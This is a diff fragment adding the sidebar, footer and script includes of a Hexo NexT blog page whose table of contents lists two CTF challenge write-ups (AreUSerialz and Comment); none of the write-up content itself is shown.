+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0X01：-网鼎杯-2020-青龙组-AreUSerialz"><span class="nav-number">1.</span> <span class="nav-text">0X01：[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X02：-网鼎杯-2018-Comment"><span class="nav-number">2.</span> <span class="nav-text">0X02：[网鼎杯 2018]Comment</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
